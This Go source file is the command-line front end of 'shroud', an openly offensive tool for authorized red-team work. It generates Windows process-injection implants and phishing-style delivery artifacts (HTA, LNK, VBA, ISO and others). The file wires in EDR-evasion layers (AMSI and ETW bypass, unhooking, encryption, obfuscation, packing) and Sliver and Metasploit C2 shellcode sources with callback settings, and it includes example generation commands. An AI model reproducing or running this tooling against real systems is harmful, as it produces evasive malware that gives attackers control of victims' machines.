// Command shroud is the Go-rewrite payload generator. It emits pure-Go
// implants (cross-compiled with GOOS=windows, no mingw) wrapping the 26
// Offensive-Panda techniques in a composable EDR-evasion stack, with Sliver
// and Metasploit as first-class C2 backends (Phase 3/4).
//
// `generate` and `build` are gated behind a one-time `shroud authorize`.
// The tool never executes produced binaries — it only compiles them.
//
//	AUTHORIZED RED-TEAM / PENTEST USE ONLY. You are responsible for scope and consent.
package main

import (
	"fmt"
	"os"
	"strings"
	"time"

	"shroud/internal/authorize"
	"shroud/internal/builder"
	"shroud/internal/catalog"
	"shroud/internal/c2"
	_ "shroud/internal/c2/donut"     // register donut provider
	_ "shroud/internal/c2/metasploit" // register metasploit provider
	_ "shroud/internal/c2/msfrpc"    // register msfrpc provider
	"shroud/internal/c2/sliver"
	"shroud/internal/delivery"
	"shroud/internal/evasion"
	"shroud/internal/ops"
	"shroud/internal/web"

	"github.com/spf13/cobra"
)

const banner = "\n" +
	"==============================================================\n" +
	" shroud — process-injection payload generator (Go rewrite)\n" +
	" AUTHORIZED RED-TEAM / PENTEST USE ONLY.\n" +
	" You are responsible for engagement scope and written consent.\n" +
	"==============================================================\n"

func main() {
	root := &cobra.Command{
		Use:   "shroud",
		Short: "process-injection payload generator (authorized red-team use)",
		Long:  "shroud emits pure-Go Windows implants wrapping the 26 Offensive-Panda\ntechniques in a composable EDR-evasion stack. Authorized use only.",
	}
	root.AddCommand(
		cmdAuthorize(),
		cmdList(),
		cmdShow(),
		cmdEvasion(),
		cmdGenerate(),
		cmdBuild(),
		cmdC2(),
		cmdSliver(),
		cmdWeb(),
	)
	if err := root.Execute(); err != nil {
		os.Exit(1)
	}
}

// ---- authorize --------------------------------------------------------------
func cmdAuthorize() *cobra.Command {
	c := &cobra.Command{
		Use:   "authorize",
		Short: "record the authorized-use marker (required once)",
		RunE: func(cmd *cobra.Command, args []string) error {
			fmt.Fprint(os.Stderr, banner)
			yes, _ := cmd.Flags().GetBool("yes")
			if err := authorize.Authorize(os.Stdin, os.Stderr, yes); err != nil {
				fmt.Fprintln(os.Stderr, err)
				os.Exit(1)
			}
			fmt.Fprintf(os.Stderr, "\nAuthorization recorded at %s\n", authorize.MarkerFile)
			return nil
		},
	}
	c.Flags().BoolP("yes", "y", false, "authorize non-interactively (for scripts)")
	return c
}

// ---- list -------------------------------------------------------------------
func cmdList() *cobra.Command {
	c := &cobra.Command{
		Use:   "list",
		Short: "list all techniques",
		RunE: func(cmd *cobra.Command, args []string) error {
			catF, _ := cmd.Flags().GetString("category")
			groups := catalog.ByCategory()
			implCount := len(catalog.Implemented())
			fmt.Printf("\nProcess Injection Series — %d techniques (%d code-generated)\n",
				len(catalog.All()), implCount)
			for _, cat := range catalog.CategoryOrder {
				if catF != "" && string(cat) != catF {
					continue
				}
				techs := groups[cat]
				if len(techs) == 0 {
					continue
				}
				fmt.Printf("\n%-12s %s\n", strings.ToUpper(string(cat)), catalog.CategoryLabel[cat])
				for _, t := range techs {
					mark := "."
					if t.Implemented {
						mark = "*"
					}
					tags := t.Tags
					if len(tags) > 2 {
						tags = tags[:2]
					}
					fmt.Printf("  %s %-5s %-44s [%s] %s\n",
						mark, strings.ToUpper(t.ID), truncName(t.Name, 44), t.Subtech,
						strings.Join(tags, ", "))
				}
			}
			fmt.Println()
			return nil
		},
	}
	c.Flags().String("category", "", "filter by category (e.g. syscalls, hollowing)")
	return c
}

func truncName(s string, n int) string {
	if len(s) <= n {
		return s
	}
	return s[:n]
}

// ---- show -------------------------------------------------------------------
func cmdShow() *cobra.Command {
	c := &cobra.Command{
		Use:   "show <id>",
		Short: "show one technique in detail",
		Args:  cobra.ExactArgs(1),
		RunE: func(cmd *cobra.Command, args []string) error {
			t, err := catalog.Resolve(args[0])
			if err != nil {
				fmt.Fprintln(os.Stderr, err)
				os.Exit(1)
			}
			fmt.Fprint(os.Stderr, banner)
			fmt.Printf("\n%s — %s\n", strings.ToUpper(t.ID), t.Name)
			status := "(scaffold)"
			if t.Implemented {
				status = "(code-generated)"
			}
			fmt.Printf("category : %s   MITRE: %s   %s\n", t.Category, t.Subtech, status)
			fmt.Printf("tags     : %s\n", strings.Join(t.Tags, ", "))
			fmt.Println("\n" + t.Summary + "\n")
			fmt.Println("Flow")
			for i, s := range t.Flow {
				fmt.Printf("  %d. %s\n", i+1, s)
			}
			fmt.Println("\nNotes")
			fmt.Println("  " + t.Notes)
			return nil
		},
	}
	return c
}

// ---- evasion ----------------------------------------------------------------
func cmdEvasion() *cobra.Command {
	c := &cobra.Command{
		Use:   "evasion",
		Short: "list evasion layers and what each defeats",
		RunE: func(cmd *cobra.Command, args []string) error {
			fmt.Println("\nEvasion layers (-e <csv>):")
			fmt.Println("  crypto precedence: aes > rc4 > xor (only the winner is kept)")
			fmt.Println("  unhook-kd supersedes unhook (stealthier, no disk read)")
			for _, l := range evasion.All {
				mark := "*"
				if !evasion.Implemented[l] {
					mark = "."
				}
				fmt.Printf("  %s %-11s %s\n", mark, l, evasion.Help[l])
			}
			fmt.Println("\n  * implemented   . planned (Phase 2)")
			fmt.Println("\nexample:  shroud generate pe26 -e aes,stomp,callbacks,dynamic-api,etw,amsi,unhook-kd")
			return nil
		},
	}
	return c
}

// ---- generate ---------------------------------------------------------------
func cmdGenerate() *cobra.Command {
	c := &cobra.Command{
		Use:   "generate [<id>]",
		Short: "generate a payload (implant project + build, or a delivery artifact)",
		Long: "generate builds a Go implant for a technique id (formats exe|dll|c) or\n" +
			"emits a delivery artifact (raw|lnk|hta|sct|vba|vbs|wsf|ps1|xsl|js|jse,\n" +
			"bat|psm1|zip|html|iso). The id is required for implant formats and\n" +
			"optional for delivery formats. Gated by `shroud authorize`.",
		Args: cobra.MaximumNArgs(1),
		RunE: runGenerate,
	}
	ops.AddGenerateFlags(c.Flags())
	return c
}

func runGenerate(cmd *cobra.Command, args []string) error {
	if err := authorize.Require(); err != nil {
		fmt.Fprint(os.Stderr, banner)
		fmt.Fprintln(os.Stderr, err)
		os.Exit(2)
	}
	fmt.Fprint(os.Stderr, banner)

	format := mustString(cmd, "format")

	// `-e list` shortcut: print layers and exit.
	if mustString(cmd, "evasion") == "list" {
		cmdEvasion().RunE(cmd, args)
		return nil
	}

	// Delivery formats take a separate path: they bypass the Go implant pipeline
	// (Assemble/Build) entirely, and the technique id is optional.
	if delivery.IsDelivery(format) {
		return runDeliver(cmd, args, format)
	}

	// Implant path: the generate logic lives in internal/ops so the CLI and the
	// web UI share one implementation. The CLI owns authorize, the banner, and
	// os.Exit; ops returns a structured result + error.
	res, err := ops.Generate(cmd, args)
	if err != nil {
		fmt.Fprintln(os.Stderr, err)
		os.Exit(1)
	}

	fmt.Fprintf(os.Stderr, "\nGenerating %s — %s\n", strings.ToUpper(res.TechniqueID), res.TechniqueName)
	fmt.Fprintf(os.Stderr, "  format      : %s\n", res.Format)
	ev := "(none)"
	if len(res.Evasion) > 0 {
		ev = joinLayers(res.Evasion)
	}
	fmt.Fprintf(os.Stderr, "  evasion     : %s\n", ev)
	fmt.Fprintf(os.Stderr, "  shellcode   : %s\n", res.Source)
	fmt.Fprintf(os.Stderr, "  output dir  : %s\n", res.OutDir)
	if res.SleepMS > 0 {
		scheme := res.SleepScheme
		if scheme == "" {
			scheme = "xor"
		}
		desc := "sleepScramble loop; payload staged, not executed"
		if scheme == "ekko" {
			desc = "Ekko tier-2 timer-driven self-modifying sleep (EXPERIMENTAL)"
		}
		fmt.Fprintf(os.Stderr, "  sleep demo  : %dms [%s] %s\n", res.SleepMS, scheme, desc)
	}
	fmt.Fprintf(os.Stderr, "\nwrote project -> %s\n", res.OutDir)
	if res.Format == "c" {
		fmt.Fprintf(os.Stderr, "   - payload.h (C header for embedding in other loaders)\n")
	} else {
		fmt.Fprintf(os.Stderr, "   - main.go, go.mod, go.sum, build.sh, README.md\n")
	}
	if res.Crypto != "" {
		fmt.Fprintf(os.Stderr, "  payload encrypted at rest with: %s\n", res.Crypto)
	}

	if !res.Built {
		if res.Format == "c" {
			fmt.Fprintf(os.Stderr, "\n(C header export — embed %s/payload.h in your loader)\n", res.OutDir)
		} else {
			fmt.Fprintf(os.Stderr, "\n(source only -- --no-build)\n")
			fmt.Fprintf(os.Stderr, "build with:  cd %s && go mod tidy && ./build.sh\n", res.OutDir)
		}
		return nil
	}
	fmt.Fprintf(os.Stderr, "\nbuilt -> %s (%d bytes)\n", res.BuiltPath, res.BuiltBytes)
	return nil
	}

// runDeliver is the delivery-format path. The emission logic lives in ops.Deliver;
// the CLI owns authorize, the banner, printing, and os.Exit.
func runDeliver(cmd *cobra.Command, args []string, format string) error {
	res, err := ops.Deliver(cmd, args, format)
	if err != nil {
		fmt.Fprintln(os.Stderr, err)
		os.Exit(1)
	}
	fmt.Fprintf(os.Stderr, "\nDelivering %s\n", res.Format)
	if res.Mode == "remote" {
		fmt.Fprintf(os.Stderr, "  mode       : remote (%s)\n", res.URL)
		if res.Launcher != "" {
			fmt.Fprintf(os.Stderr, "  launcher   : %s\n", res.Launcher)
		}
	} else {
		fmt.Fprintf(os.Stderr, "  mode       : inline\n")
		fmt.Fprintf(os.Stderr, "  shellcode  : %s (%d bytes)\n", orEmpty(res.Source, "(demo stub)"), res.ShellcodeBytes)
	}
	if res.Technique != "" {
		fmt.Fprintf(os.Stderr, "  technique  : %s (hint)\n", res.Technique)
	}
	fmt.Fprintf(os.Stderr, "  output dir : %s\n", res.OutDir)
	for _, a := range res.Artifacts {
		fmt.Fprintf(os.Stderr, "  wrote -> %s (%d bytes)\n", a.Path, a.Bytes)
	}
	return nil
}


// ---- build ------------------------------------------------------------------
func cmdBuild() *cobra.Command {
	c := &cobra.Command{
		Use:   "build <dir>",
		Short: "(re)build a generated project",
		Args:  cobra.ExactArgs(1),
		RunE: func(cmd *cobra.Command, args []string) error {
			if err := authorize.Require(); err != nil {
				fmt.Fprint(os.Stderr, banner)
				fmt.Fprintln(os.Stderr, err)
				os.Exit(2)
			}
			fmt.Fprint(os.Stderr, banner)
			garble, _ := cmd.Flags().GetBool("garble")
			pack, _ := cmd.Flags().GetString("pack")
			res, err := builder.Build(args[0], garble, pack)
			if err != nil {
				fmt.Fprintln(os.Stderr, err)
				os.Exit(1)
			}
			fmt.Fprintf(os.Stderr, "OK -> %s (%d bytes)\n", res.OutPath, res.Bytes)
			return nil
		},
	}
	c.Flags().Bool("garble", false, "build with garble -literals")
	c.Flags().String("pack", "", "post-build packer: upx (EXE only)")
	return c
}

// ---- c2 ---------------------------------------------------------------------
// cmdC2 exposes the pluggable C2 / shellcode-source backends: `list` shows
// registered providers, `preflight <name>` checks a provider's deps/config
// without contacting a server. The full path is `shroud generate pe26 --c2
// <name> ...`; each provider's flags are namespaced (e.g. --sliver-*, --msf-*).
func cmdC2() *cobra.Command {
	c := &cobra.Command{
		Use:   "c2",
		Short: "C2 / shellcode-source backends (for --c2)",
		Long: "C2 backends supply shellcode to `shroud generate --c2 <name>`. `list` shows\nregistered backends; `preflight <name>` checks a backend's environment (client\nbinary, config) without contacting a server. Each backend owns namespaced flags\n(e.g. --sliver-config, --msf-payload) that are read only when that backend is\nselected.",
	}
	c.AddCommand(cmdC2List(), cmdC2Preflight())
	return c
}

func cmdC2List() *cobra.Command {
	return &cobra.Command{
		Use:   "list",
		Short: "list registered C2 backends",
		RunE: func(cmd *cobra.Command, args []string) error {
			fmt.Println("\nC2 / shellcode-source backends (--c2 <name>):")
			for _, name := range c2.Names() {
				p, _ := c2.Resolve(name)
				fmt.Printf("  %-12s %s\n", name, p.Help())
			}
			fmt.Println("  raw          read shellcode from -s/--shellcode (default; no backend)")
			fmt.Println("\nexample:  shroud generate pe26 --c2 sliver ...")
			fmt.Println("          shroud generate pe26 --c2 metasploit --msf-payload windows/x64/exec --msf-extra CMD=calc")
			return nil
		},
	}
}

func cmdC2Preflight() *cobra.Command {
	c := &cobra.Command{
		Use:   "preflight <name>",
		Short: "check a backend's deps/config (no server contact)",
		Args:  cobra.ExactArgs(1),
		RunE: func(cmd *cobra.Command, args []string) error {
			p, err := c2.Resolve(args[0])
			if err != nil {
				fmt.Fprintln(os.Stderr, err)
				os.Exit(1)
			}
			fmt.Fprint(os.Stderr, banner)
			if err := p.Preflight(cmd); err != nil {
				fmt.Fprintf(os.Stderr, "[!] %s: %v\n", p.Name(), err)
				os.Exit(1)
			}
			fmt.Fprintf(os.Stderr, "[+] %s preflight OK\n", p.Name())
			return nil
		},
	}
	// All providers' flags are present; only the selected provider's Preflight
	// reads them. Lets `shroud c2 preflight sliver --sliver-config x ...` work.
	c2.AddAllFlags(c.Flags())
	return c
}

// ---- sliver -----------------------------------------------------------------
// cmdSliver exposes the Sliver C2 backend for standalone testing: `preflight`
// checks the env (client binary + config), `fetch` generates a shellcode implant
// from the server and dumps the .bin (no shroud payload wrapping). The full
// path is `shroud generate pe26 --c2 sliver ...`.
func cmdSliver() *cobra.Command {
	c := &cobra.Command{
		Use:   "sliver",
		Short: "Sliver C2 backend (shellcode source)",
		Long: "Sliver C2 backend. `preflight` checks the env; `fetch` generates a\nshellcode implant from the server and writes the .bin. For the full hardened\npath use: shroud generate pe26 --c2 sliver ....",
	}
	c.AddCommand(cmdSliverPreflight(), cmdSliverFetch())
	return c
}

func cmdSliverPreflight() *cobra.Command {
	return &cobra.Command{
		Use:   "preflight",
		Short: "check sliver-client + operator config are usable",
		RunE: func(cmd *cobra.Command, args []string) error {
			opts := sliver.Options{
				Config:    mustString(cmd, "sliver-config"),
				LHost:     mustString(cmd, "lhost"),
				LPort:     mustInt(cmd, "lport"),
				Transport: mustString(cmd, "transport"),
			}
			fmt.Fprint(os.Stderr, banner)
			if bin, err := sliver.LocateClient(); err != nil {
				fmt.Fprintf(os.Stderr, "[!] %v\n", err)
			} else {
				fmt.Fprintf(os.Stderr, "[+] sliver-client: %s\n", bin)
			}
			if err := sliver.Preflight(opts); err != nil {
				fmt.Fprintf(os.Stderr, "[!] %v\n", err)
				os.Exit(1)
			}
			fmt.Fprintf(os.Stderr, "[+] config:    %s\n", opts.Config)
			fmt.Fprintf(os.Stderr, "[+] callback:  %s:%d (%s)\n", opts.LHost, opts.LPort, opts.Transport)
			fmt.Fprintln(os.Stderr, "\nPreflight OK — ready for `shroud generate pe26 --c2 sliver ...`")
			return nil
		},
	}
}

func cmdSliverFetch() *cobra.Command {
	c := &cobra.Command{
		Use:   "fetch",
		Short: "generate a shellcode implant from the Sliver server (writes .bin)",
		RunE: func(cmd *cobra.Command, args []string) error {
			if err := authorize.Require(); err != nil {
				fmt.Fprint(os.Stderr, banner)
				fmt.Fprintln(os.Stderr, err)
				os.Exit(2)
			}
			fmt.Fprint(os.Stderr, banner)
			opts := sliver.Options{
				Config:    mustString(cmd, "sliver-config"),
				Name:      mustString(cmd, "name"),
				LHost:     mustString(cmd, "lhost"),
				LPort:     mustInt(cmd, "lport"),
				Transport: mustString(cmd, "transport"),
				SaveDir:   mustString(cmd, "save"),
			}
			res, err := sliver.FetchShellcode(opts)
			if err != nil {
				fmt.Fprintln(os.Stderr, err)
				os.Exit(1)
			}
			out := mustString(cmd, "out")
			if out == "" {
				out = "sliver-" + res.Name + ".bin"
			}
			if err := os.WriteFile(out, res.Bytes, 0o644); err != nil {
				fmt.Fprintln(os.Stderr, err)
				os.Exit(1)
			}
			fmt.Fprintf(os.Stderr, "\n[+] wrote %d bytes -> %s (source: %s)\n",
				len(res.Bytes), out, res.SavePath)
			return nil
		},
	}
	c.Flags().String("sliver-config", "", "operator .cfg (from sliver new-operator)")
	c.Flags().String("name", "", "implant name (default shroud)")
	c.Flags().String("lhost", "", "implant callback host")
	c.Flags().Int("lport", 0, "implant callback port")
	c.Flags().String("transport", "mtls", "mtls|https|wg")
	c.Flags().String("save", "", "dir to collect the .bin (default temp)")
	c.Flags().StringP("out", "o", "", "output .bin path (default sliver-<name>.bin)")
	return c
}

// ---- helpers ----------------------------------------------------------------
func mustString(cmd *cobra.Command, name string) string {
	v, _ := cmd.Flags().GetString(name)
	return v
}

func mustBool(cmd *cobra.Command, name string) bool {
	v, _ := cmd.Flags().GetBool(name)
	return v
}

func mustInt(cmd *cobra.Command, name string) int {
	v, _ := cmd.Flags().GetInt(name)
	return v
}

func mustDuration(cmd *cobra.Command, name string) time.Duration {
	v, _ := cmd.Flags().GetDuration(name)
	return v
}

func joinLayers(layers []evasion.Layer) string {
	var ss []string
	for _, l := range layers {
		ss = append(ss, string(l))
	}
	return strings.Join(ss, ", ")
}

func orEmpty(s, def string) string {
	if s == "" {
		return def
	}
	return s
}

func orFlag(cond bool, a, b string) string {
	if cond {
		return a
	}
	return b
}
// ---- web ---------------------------------------------------------------------
// cmdWeb starts the local-only browser console. Browsing is ungated; the
// generate/deliver *endpoints* are gated by the bearer token + the authorize gate.
// `--browser` opens the default browser to the console URL with the token appended.
func cmdWeb() *cobra.Command {
	c := &cobra.Command{
		Use:   "web",
		Short: "start the local web console (127.0.0.1)",
		Long: "web starts a local-only browser console (bound to 127.0.0.1) that\n" +
			"surfaces the catalog, generate/deliver forms, C2 providers, and artifact\ndownload. A random bearer token is printed at startup; pass --browser to open\n" +
			"the URL with the token appended. The generate/deliver endpoints still\nrequire `shroud authorize`.",
		RunE: func(cmd *cobra.Command, args []string) error {
			addr, _ := cmd.Flags().GetString("addr")
			token, _ := cmd.Flags().GetString("token")
			openBro, _ := cmd.Flags().GetBool("browser")
			srv, err := web.New(addr, token)
			if err != nil {
				fmt.Fprintln(os.Stderr, err)
				os.Exit(1)
			}
			url := "http://" + srv.Addr() + "/?token=" + srv.Token()
			fmt.Fprintf(os.Stderr, "\nshroud web console\n")
			fmt.Fprintf(os.Stderr, "  url   : %s\n", url)
			fmt.Fprintf(os.Stderr, "  token : %s\n", srv.Token())
			fmt.Fprintf(os.Stderr, "  (local-only; bearer-gated; generate endpoints require `shroud authorize`)\n\n")
			if openBro {
				web.OpenBrowser(url)
			}
			if err := srv.ListenAndServe(); err != nil {
				fmt.Fprintln(os.Stderr, err)
				os.Exit(1)
			}
			return nil
		},
	}
	c.Flags().String("addr", "127.0.0.1:7780", "listen address (loopback only)")
	c.Flags().String("token", "", "bearer token (random if omitted)")
	c.Flags().Bool("browser", false, "open the default browser to the console URL")
	return c
}
